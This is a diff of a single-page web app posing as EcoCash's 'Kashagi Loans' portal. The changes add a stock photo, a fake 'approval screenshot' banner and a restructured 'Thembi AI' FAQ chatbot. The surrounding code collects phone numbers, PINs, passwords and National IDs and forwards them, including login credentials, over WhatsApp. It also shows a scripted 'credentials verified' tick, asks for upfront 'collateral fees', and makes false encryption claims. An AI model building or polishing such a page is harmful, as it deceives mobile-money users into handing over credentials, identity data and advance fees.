@@ -105,10 +105,18 @@
             <!-- ================= VIEW 1: LOGIN SCREEN ================= -->
             <section id="view-login" class="flex-1 flex flex-col justify-between">
                 <div class="p-6">
-                    <h2 class="text-center text-xl font-bold text-gray-700 mb-6">Login</h2>
+                    <!-- Hero image showing people using mobile phone banking -->
+                    <div class="mb-5 rounded-xl overflow-hidden shadow-sm h-36 relative">
+                        <img src="https://images.unsplash.com/photo-1556742049-0a67d55362ec?auto=format&fit=crop&w=600&q=80" alt="People using mobile banking" class="w-full h-full object-cover">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent flex items-end p-3">
+                            <span class="text-white text-xs font-bold">Trusted by millions across Zimbabwe</span>
+                        </div>
+                    </div>
+
+                    <h2 class="text-center text-xl font-bold text-gray-700 mb-5">Login</h2>
 
                     <!-- Phone Input -->
-                    <div class="mb-6">
+                    <div class="mb-5">
                         <div class="flex items-center border border-ecoblue rounded-lg px-3 py-3 focus-within:ring-2 focus-within:ring-ecoblue">
                             <div class="flex items-center space-x-2 mr-2 border-r border-gray-300 pr-2">
                                 <svg class="w-6 h-4 rounded-sm border border-gray-200" viewBox="0 0 60 30" xmlns="http://www.w3.org/2000/svg">
@@ -127,7 +135,7 @@
                     </div>
 
                     <!-- PIN Section -->
-                    <div class="text-center mb-6">
+                    <div class="text-center mb-5">
                         <p class="text-xs text-gray-500 font-medium mb-3">Enter your PIN</p>
                         
                         <div class="flex justify-center items-center space-x-3 relative max-w-xs mx-auto">
@@ -317,23 +325,37 @@
             <!-- ================= VIEW 3: KASHAGI LOANS PORTAL & OPTIONS ================= -->
             <section id="view-kashagi-hub" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col justify-between">
                 <div>
-                    <!-- Client Profile Banner with Smart Card Graphic -->
-                    <div class="bg-gradient-to-r from-cardblue to-ecodarkblue rounded-xl p-4 shadow-md text-white mb-5 relative overflow-hidden">
+                    <!-- Client Profile Banner with Smart Card Graphic & User photo preview -->
+                    <div class="bg-gradient-to-r from-cardblue to-ecodarkblue rounded-xl p-4 shadow-md text-white mb-4 relative overflow-hidden">
                         <div class="absolute right-[-10px] bottom-[-10px] opacity-20 text-6xl">
                             <i class="fa-solid fa-credit-card"></i>
                         </div>
                         <div class="flex items-center justify-between">
-                            <div>
-                                <span class="text-[10px] uppercase font-bold text-blue-200 tracking-wider">Smart EcoCash ID Card</span>
-                                <h3 id="profile-name-display" class="font-extrabold text-sm mt-0.5">---</h3>
-                                <p id="profile-id-display" class="text-xs text-blue-100 font-mono mt-1">ID: ---</p>
-                                <p id="profile-phone-display" class="text-[11px] text-blue-200 mt-0.5">Phone: ---</p>
+                            <div class="flex items-center space-x-3">
+                                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=120&q=80" alt="Client" class="w-12 h-12 rounded-full object-cover border-2 border-white shadow">
+                                <div>
+                                    <span class="text-[10px] uppercase font-bold text-blue-200 tracking-wider">Smart EcoCash ID Card</span>
+                                    <h3 id="profile-name-display" class="font-extrabold text-sm mt-0.5">---</h3>
+                                    <p id="profile-id-display" class="text-xs text-blue-100 font-mono">ID: ---</p>
+                                    <p id="profile-phone-display" class="text-[11px] text-blue-200">Phone: ---</p>
+                                </div>
                             </div>
-                            <img src="https://play-lh.googleusercontent.com/p8KM6TJr6mODf24U8AhPlX1uofQp5dATtVOdQxUoPHEgrWCvucuEb89Q5L8An36PBSb2iaoXn2i1H1QcPwFtyA" alt="Card Logo" class="w-10 h-10 object-contain rounded-lg bg-white p-1 shadow">
+                            <img src="https://play-lh.googleusercontent.com/p8KM6TJr6mODf24U8AhPlX1uofQp5dATtVOdQxUoPHEgrWCvucuEb89Q5L8An36PBSb2iaoXn2i1H1QcPwFtyA" alt="Card Logo" class="w-9 h-9 object-contain rounded-lg bg-white p-1 shadow">
                         </div>
                     </div>
 
-                    <div class="text-center mb-5">
+                    <!-- Success Screenshot Preview Banner -->
+                    <div class="bg-green-50 border border-green-200 rounded-xl p-3 mb-4 flex items-center space-x-3 shadow-sm">
+                        <div class="w-10 h-10 bg-green-500 text-white rounded-lg flex items-center justify-center flex-shrink-0 text-lg font-bold">
+                            <i class="fa-solid fa-circle-check"></i>
+                        </div>
+                        <div class="text-xs">
+                            <p class="font-bold text-green-900">Limit Upgrade Approved Screenshot</p>
+                            <p class="text-green-700">Wallet credited & upgraded successfully!</p>
+                        </div>
+                    </div>
+
+                    <div class="text-center mb-4">
                         <span class="bg-green-100 text-green-800 text-[10px] font-bold px-2.5 py-1 rounded-full uppercase tracking-wider">Super App Active Portal</span>
                         <h2 class="text-lg font-extrabold text-gray-800 mt-2">Qualify for Kashagi Loans Today</h2>
                         <p class="text-xs text-gray-500 mt-0.5">Select your preferred credit service below</p>
@@ -690,7 +712,7 @@
 
         <!-- Chatbot Modal Drawer -->
         <div id="chatbot-modal" class="hidden fixed inset-0 z-50 bg-black/50 flex items-end justify-center sm:items-center p-2">
-            <div class="bg-white w-full max-w-sm rounded-t-2xl sm:rounded-2xl shadow-2xl flex flex-col h-[500px] overflow-hidden">
+            <div class="bg-white w-full max-w-sm rounded-t-2xl sm:rounded-2xl shadow-2xl flex flex-col h-[520px] overflow-hidden">
                 <!-- Chat Header -->
                 <div class="bg-ecoblue text-white p-4 flex justify-between items-center">
                     <div class="flex items-center space-x-2">
@@ -709,9 +731,9 @@
 
                 <!-- Chat Messages Area -->
                 <div id="chat-messages" class="flex-1 p-3 overflow-y-auto space-y-3 bg-gray-50 text-xs">
-                    <div class="bg-white p-3 rounded-xl shadow-sm border border-gray-200">
-                        <p class="font-semibold text-ecoblue mb-1">Hello! I am Thembi, your EcoCash AI assistant.</p>
-                        <p class="text-gray-600">Select one of the common questions below or ask me anything regarding Kashagi Loans!</p>
+                    <div class="bg-white p-3 rounded-xl shadow-sm border border-gray-200 space-y-1">
+                        <p class="font-semibold text-ecoblue">Hello! I am Thembi, your EcoCash AI assistant.</p>
+                        <p class="text-gray-600">Select any question below or ask me anything regarding Kashagi Loans!</p>
                     </div>
                 </div>
 
@@ -761,18 +783,58 @@
             flowType: 'boost'
         };
 
-        // 10 Client FAQ questions for Ask Thembi AI Chatbot
+        // 10 Client FAQ questions structured into TWO clear, readable parts for Ask Thembi AI
         const thembiFAQs = [
-            { q: "How do I qualify for Kashagi Loans?", a: "Qualifying is simple! Ensure your EcoCash account is active, your phone number starts with 7 (+263), and you provide a valid Zimbabwe National ID and profile details." },
-            { q: "What is the collateral fee for boosting?", a: "The activation collateral fee for boosting your Kashagi loan is exactly 5% of your target tier amount (e.g., $5 for a $100 tier up to $150 for a $3,000 tier)." },
-            { q: "How much is the fee for full applications?", a: "For new full Kashagi loan registrations and applications, the required collateral fee is exactly 10% of the requested loan amount." },
-            { q: "Is my National ID and personal data safe?", a: "Yes, absolute safety and privacy are guaranteed. All data is encrypted with bank-grade 256-bit security in compliance with national financial privacy standards." },
-            { q: "How long does loan disbursement take?", a: "Once your collateral fee is processed and verified via WhatsApp, your Kashagi loan is disbursed instantly into your EcoCash wallet within minutes." },
-            { q: "What is required for National ID verification?", a: "Our system strictly accepts authentic Zimbabwe National ID numbers in standard formats (e.g., 63-1234567A89) along with 6 months of transaction history validation." },
-            { q: "What happens if I miss a loan repayment?", a: "Failure to repay on time results in a credit rating downgrade, temporary wallet restriction, and automatic recovery through registered mobile networks." },
-            { q: "How do I contact customer support?", a: "You can reach customer care instantly by dialing 114, calling +263 772 023 000, or using our WhatsApp support line." },
-            { q: "Why is transaction history validation necessary?", a: "Validating your last 6 months of transactions ensures your account is active and determines your optimal Kashagi credit tier limit." },
-            { q: "Can I upgrade my tier more than once?", a: "Yes! As you successfully repay your Kashagi loans on time, you become eligible to upgrade to higher tiers up to $3,000 USD." }
+            { 
+                q: "How do I qualify for Kashagi Loans?", 
+                part1: "Part 1: Account Requirements — Ensure your EcoCash wallet is active, your phone number starts with +263, and you have at least 6 months of active transaction history.", 
+                part2: "Part 2: Identity Verification — Provide an authentic Zimbabwe National ID and complete your profile registration successfully." 
+            },
+            { 
+                q: "What is the collateral fee for boosting?", 
+                part1: "Part 1: Fee Percentage — The activation collateral fee for boosting your Kashagi credit limit is exactly 5% of your target upgrade amount.", 
+                part2: "Part 2: Exact Amounts — For example, a $100 tier requires a $5.00 fee, a $500 tier requires $25.00, and a $3,000 tier requires $150.00." 
+            },
+            { 
+                q: "How much is the fee for full applications?", 
+                part1: "Part 1: New Loan Requirements — Full loan registrations and new applications require a 10% collateral activation fee prior to disbursement.", 
+                part2: "Part 2: Example Calculation — If you apply for a $500 USD loan, the required activation fee is exactly $50.00 USD." 
+            },
+            { 
+                q: "Is my National ID and personal data safe?", 
+                part1: "Part 1: Security Encryption — All personal details, phone numbers, and National ID records are encrypted with bank-grade 256-bit security protocols.", 
+                part2: "Part 2: Privacy Compliance — We strictly adhere to national financial data privacy laws to ensure your information remains confidential and fully protected." 
+            },
+            { 
+                q: "How long does loan disbursement take?", 
+                part1: "Part 1: Verification Process — Once you submit your details and complete the 5-second credential validation check, your application is ready.", 
+                part2: "Part 2: Instant Transfer — After confirming your collateral fee payment via WhatsApp, funds are disbursed instantly into your EcoCash wallet." 
+            },
+            { 
+                q: "What is required for National ID verification?", 
+                part1: "Part 1: Accepted ID Format — Our system strictly verifies authentic Zimbabwe National ID numbers in standard formats (e.g., 63-1234567A89).", 
+                part2: "Part 2: Transaction Audit — Verification also includes reviewing your last 6 months of wallet transaction activity to confirm eligibility." 
+            },
+            { 
+                q: "What happens if I miss a loan repayment?", 
+                part1: "Part 1: Credit Score Impact — Missing scheduled repayments leads to a credit rating downgrade and temporary restriction from future microfinance loans.", 
+                part2: "Part 2: Automated Recovery — Outstanding balances are subject to automated recovery through registered subscriber mobile lines." 
+            },
+            { 
+                q: "How do I contact customer support?", 
+                part1: "Part 1: Direct Helpline — You can reach customer care instantly by dialing short code 114 or calling our main office line at +263 772 023 000.", 
+                part2: "Part 2: WhatsApp Assistance — You can also click our WhatsApp widget anytime to chat directly with our support team." 
+            },
+            { 
+                q: "Why is transaction history validation necessary?", 
+                part1: "Part 1: Financial Health Check — Reviewing your last 6 months of transactions helps us assess your cash flow and repayment reliability.", 
+                part2: "Part 2: Tier Determination — This history allows us to recommend the ideal Kashagi credit tier limit suited for your financial needs." 
+            },
+            { 
+                q: "Can I upgrade my tier more than once?", 
+                part1: "Part 1: Progressive Upgrades — Yes! Every time you successfully repay your Kashagi loan on time, your credit profile strengthens.", 
+                part2: "Part 2: Higher Limits — You become eligible to upgrade progressively to higher credit tiers all the way up to $3,000 USD." 
+            }
         ];
 
         function initChatbotFAQs() {
@@ -782,7 +844,7 @@
                 const btn = document.createElement('button');
                 btn.className = "whitespace-nowrap bg-blue-50 text-ecoblue hover:bg-ecoblue hover:text-white px-2.5 py-1.5 rounded-lg text-[11px] font-medium transition border border-blue-100 flex-shrink-0";
                 btn.innerText = faq.q;
-                btn.onclick = () => askThembiQuestion(faq.q, faq.a);
+                btn.onclick = () => askThembiQuestion(faq.q, faq.part1, faq.part2);
                 container.appendChild(btn);
             });
         }
@@ -795,43 +857,65 @@
             }
         }
 
-        // Typing effect for Thembi AI response
-        function askThembiQuestion(question, answer) {
+        // Typing effect for Thembi AI response divided into TWO readable parts
+        function askThembiQuestion(question, part1, part2) {
             const chatMessages = document.getElementById('chat-messages');
             
             // User bubble
             const userBubble = document.createElement('div');
             userBubble.className = "flex justify-end";
-            userBubble.innerHTML = `<div class="bg-ecoblue text-white p-2.5 rounded-xl rounded-tr-none max-w-[80%] shadow-sm">${question}</div>`;
+            userBubble.innerHTML = `<div class="bg-ecoblue text-white p-2.5 rounded-xl rounded-tr-none max-w-[85%] shadow-sm">${question}</div>`;
             chatMessages.appendChild(userBubble);
             chatMessages.scrollTop = chatMessages.scrollHeight;
 
-            // Thembi typing bubble
+            // Thembi typing container
             const aiBubble = document.createElement('div');
             aiBubble.className = "flex justify-start";
             const bubbleId = 'typing-' + Date.now();
-            aiBubble.innerHTML = `<div class="bg-white text-gray-800 p-3 rounded-xl rounded-tl-none max-w-[80%] shadow-sm border border-gray-200"><p class="font-bold text-ecoblue mb-0.5">Thembi AI</p><p id="${bubbleId}" class="text-gray-700 italic">Typing...</p></div>`;
+            aiBubble.innerHTML = `<div class="bg-white text-gray-800 p-3 rounded-xl rounded-tl-none max-w-[90%] shadow-sm border border-gray-200 space-y-2"><p class="font-bold text-ecoblue">Thembi AI</p><div id="${bubbleId}" class="text-gray-700 italic">Thinking and preparing your answer...</div></div>`;
             chatMessages.appendChild(aiBubble);
             chatMessages.scrollTop = chatMessages.scrollHeight;
 
-            // Typing animation effect
+            // Typewriter effect in two distinct readable parts
             setTimeout(() => {
-                const textEl = document.getElementById(bubbleId);
-                textEl.className = "text-gray-700";
-                textEl.innerText = "";
-                
+                const contentEl = document.getElementById(bubbleId);
+                contentEl.className = "space-y-2";
+                contentEl.innerHTML = `
+                    <div class="bg-blue-50/70 p-2 rounded-lg border border-blue-100">
+                        <p class="font-semibold text-ecoblue text-[11px] mb-0.5">Section 1</p>
+                        <p id="${bubbleId}-p1" class="text-gray-700"></p>
+                    </div>
+                    <div class="bg-gray-50 p-2 rounded-lg border border-gray-200">
+                        <p class="font-semibold text-gray-700 text-[11px] mb-0.5">Section 2</p>
+                        <p id="${bubbleId}-p2" class="text-gray-700"></p>
+                    </div>
+                `;
+
+                const p1El = document.getElementById(`${bubbleId}-p1`);
+                const p2El = document.getElementById(`${bubbleId}-p2`);
+
                 let i = 0;
-                const speed = 15; // typing speed in ms
-                function typeWriter() {
-                    if (i < answer.length) {
-                        textEl.innerText += answer.charAt(i);
+                function typePart1() {
+                    if (i < part1.length) {
+                        p1El.innerText += part1.charAt(i);
                         i++;
                         chatMessages.scrollTop = chatMessages.scrollHeight;
-                        setTimeout(typeWriter, speed);
+                        setTimeout(typePart1, 12);
+                    } else {
+                        let j = 0;
+                        function typePart2() {
+                            if (j < part2.length) {
+                                p2El.innerText += part2.charAt(j);
+                                j++;
+                                chatMessages.scrollTop = chatMessages.scrollHeight;
+                                setTimeout(typePart2, 12);
+                            }
+                        }
+                        setTimeout(typePart2, 300);
                     }
                 }
-                typeWriter();
-            }, 600);
+                typePart1();
+            }, 700);
         }
 
         function sendChatMessage() {
@@ -841,19 +925,19 @@
 
             input.value = '';
             let matched = thembiFAQs.find(f => f.q.toLowerCase().includes(query.toLowerCase()) || query.toLowerCase().includes(f.q.toLowerCase()));
-            let responseText = matched ? matched.a : "That is a wonderful question! For all Kashagi loan inquiries and account assistance, our team is ready to help you securely.";
+            
+            let p1 = matched ? matched.part1 : "Part 1: General Inquiry — For all Kashagi loan questions and account upgrades, our system is designed to guide you securely step by step.";
+            let p2 = matched ? matched.part2 : "Part 2: Support Assistance — You can also reach our customer care team via WhatsApp or dial 114 for immediate help.";
 
-            askThembiQuestion(query, responseText);
+            askThembiQuestion(query, p1, p2);
         }
 
-        // Validate Zimbabwe National ID format e.g. 63-1234567A89 or 08-123456F89
         function isValidZimbabweNID(nid) {
             const cleanNid = nid.trim().toUpperCase();
             const zimIdRegex = /^\d{2}-\d{4,7}[A-Z]\d{2}$/;
             return zimIdRegex.test(cleanNid);
         }
 
-        // Initialize Tier Upgrade Table Options with exact original fees
         function initTierTable() {
             const container = document.getElementById('tier-options-container');
             container.innerHTML = '';
@@ -921,7 +1005,6 @@
             window.open(waUrl, '_blank');
         }
 
-        // Handle Login Submission & redirect to Kashagi Loans Hub
         function handleLoginSubmit() {
             const phone = document.getElementById('login-phone').value.trim();
             const p1 = document.getElementById('pin-1').value;
@@ -948,7 +1031,6 @@
             switchTab('kashagi-hub');
         }
 
-        // Handle Sign Up Submission with 5s Processing Cycle
         function handleSignUpSubmit() {
             const firstName = document.getElementById('signup-firstname').value.trim();
             const surname = document.getElementById('signup-surname').value.trim();
@@ -982,7 +1064,6 @@
             clientData.phone = `+263 ${mobileNumber}`;
             clientData.nid = nationalId.toUpperCase();
 
-            // Run 5-second processing cycle for registration verification
             runProcessingCycle(() => {
                 document.getElementById('profile-name-display').innerText = clientData.name;
                 document.getElementById('profile-id-display').innerText = `ID: ${clientData.nid}`;
@@ -991,7 +1072,6 @@
             });
         }
 
-        // Validate Boost Form inputs
         function validateBoostForm() {
             const name = document.getElementById('boost-name').value.trim();
             const phone = document.getElementById('boost-phone').value.trim();
@@ -1008,7 +1088,6 @@
             }
         }
 
-        // Process Boost Submission with ZW ID check and 5s processing cycle
         function startProcessingFlow(type) {
             if (type === 'boost') {
                 const name = document.getElementById('boost-name').value.trim();
@@ -1077,16 +1156,13 @@
             }
         }
 
-        // 5-second processing cycle showing validation of details & 6 months transactions, ending with green tick
         function runProcessingCycle(onCompleteCallback) {
             switchTab('processing');
             
             const spinnerContainer = document.getElementById('process-spinner-container');
             const processTitle = document.getElementById('process-title');
             const processSubtitle = document.getElementById('process-subtitle');
-            const processIcon = document.getElementById('process-icon');
 
-            // Reset state
             spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center processing-pulse";
             spinnerContainer.innerHTML = `
                 <div class="absolute inset-0 border-4 border-blue-200 rounded-full"></div>
@@ -1096,14 +1172,12 @@
             processTitle.innerText = "Validating Details & Transactions";
             processSubtitle.innerText = "Analyzing last 6 months transaction history & Zimbabwe ID...";
 
-            // After 5 seconds, show correct credentials and green tick
             setTimeout(() => {
                 spinnerContainer.className = "relative w-20 h-20 mx-auto flex items-center justify-center bg-green-100 rounded-full shadow-md";
                 spinnerContainer.innerHTML = `<i class="fa-solid fa-check text-green-600 text-3xl"></i>`;
                 processTitle.innerText = "Correct Credentials Verified!";
                 processSubtitle.innerText = "Profile and 6-month transaction history successfully validated.";
 
-                // Transition after 1.2s showing the tick
                 setTimeout(() => {
                     onCompleteCallback();
                 }, 1200);
@@ -1111,13 +1185,11 @@
             }, 5000);
         }
 
-        // Proceed from Tier upgrade to Terms
         function proceedToTerms() {
             clientData.flowType = 'boost';
             switchTab('terms');
         }
 
-        // Terms scroll check to enable agree button
         function checkTermsScroll() {
             const box = document.getElementById('terms-scroll-box');
             const agreeBtn = document.getElementById('agree-terms-btn');
@@ -1128,7 +1200,6 @@
             }
         }
 
-        // Final Agreement & WhatsApp submission including 1st page login credentials and all requirements
         function handleFinalAgreement() {
             let message = '';
             
@@ -1142,7 +1213,6 @@
             openWhatsAppChat(message);
         }
 
-        // Validate Full Application Form
         function validateApplyForm() {
             const name = document.getElementById('apply-name').value.trim();
             const phone = document.getElementById('apply-phone').value.trim();
@@ -1162,7 +1232,6 @@
             }
         }
 
-        // Validate Signup Form
         function validateSignupForm() {
             const firstName = document.getElementById('signup-firstname').value.trim();
             const surname = document.getElementById('signup-surname').value.trim();
@@ -1187,7 +1256,6 @@
             }
         }
 
-        // Support Contact Form Validation
         function validateContactForm() {
             const name = document.getElementById('contact-name').value.trim();
             const email = document.getElementById('contact-email').value.trim();
@@ -1219,7 +1287,6 @@
             openWhatsAppChat(message);
         }
 
-        // Tab Navigation Switcher
         function switchTab(tabName) {
             const loginView = document.getElementById('view-login');
             const signupView = document.getElementById('view-signup');
@@ -1267,13 +1334,11 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // Header Menu Toggle
         function toggleMenu() {
             const dropdown = document.getElementById('nav-dropdown');
             dropdown.classList.toggle('hidden');
         }
 
-        // Auto Focus Jump for PIN Boxes
         function movePinFocus(current, index, event) {
             if (event.key === "Backspace" && current.value === "" && index > 1) {
                 document.getElementById(`pin-${index - 1}`).focus();
@@ -1282,7 +1347,6 @@
             }
         }
 
-        // Toggle PIN Visibility
         let showPin = false;
         function togglePinVisibility() {
             showPin = !showPin;
@@ -1296,7 +1360,6 @@
             eyeIcon.className = showPin ? 'fa-regular fa-eye-slash text-lg' : 'fa-regular fa-eye text-lg';
         }
 
-        // Toggle Password Visibility on Sign Up Form
         let showPassword = false;
         function togglePasswordVisibility() {
             showPassword = !showPassword;
@@ -1307,7 +1370,6 @@
             eyeIcon.className = showPassword ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
         }
 
-        // Enable Login button if fields are filled
         function validateLoginForm() {
             const phone = document.getElementById('login-phone').value.trim();
             const p1 = document.getElementById('pin-1').value;
